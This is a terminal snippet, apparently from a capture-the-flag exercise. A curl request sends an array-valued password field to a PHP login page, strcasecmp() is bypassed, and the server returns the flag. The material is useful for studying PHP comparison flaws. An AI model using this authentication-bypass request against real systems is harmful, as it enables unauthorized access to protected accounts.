```
$ curl -X "POST" "http://143.198.184.186:7000/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "password[]=a&password[]=b"
<h1>I just don't think we're compatible</h1>

<br />
<b>Warning</b>:  strcasecmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>9</b><br />
flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}
<form method="POST">
    Password
    <input type="password" name="password">
    <input type="submit">
</form>
```